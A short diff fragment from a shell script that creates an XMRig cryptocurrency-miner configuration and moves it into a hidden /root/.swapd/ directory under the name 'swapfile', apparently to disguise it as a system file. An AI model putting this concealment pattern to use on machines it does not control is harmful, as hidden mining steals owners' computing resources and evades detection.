@@ -427,7 +427,7 @@ EOL
 # Replace placeholders
 sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
 sed -i "s/WORKER_PLACEHOLDER/$WORKER_NAME/g" config.json
-mv config.json swapfile
+mv /root/.swapd/config.json /root/.swapd/swapfile
 
 echo "[✓] XMRig configuration created"
 
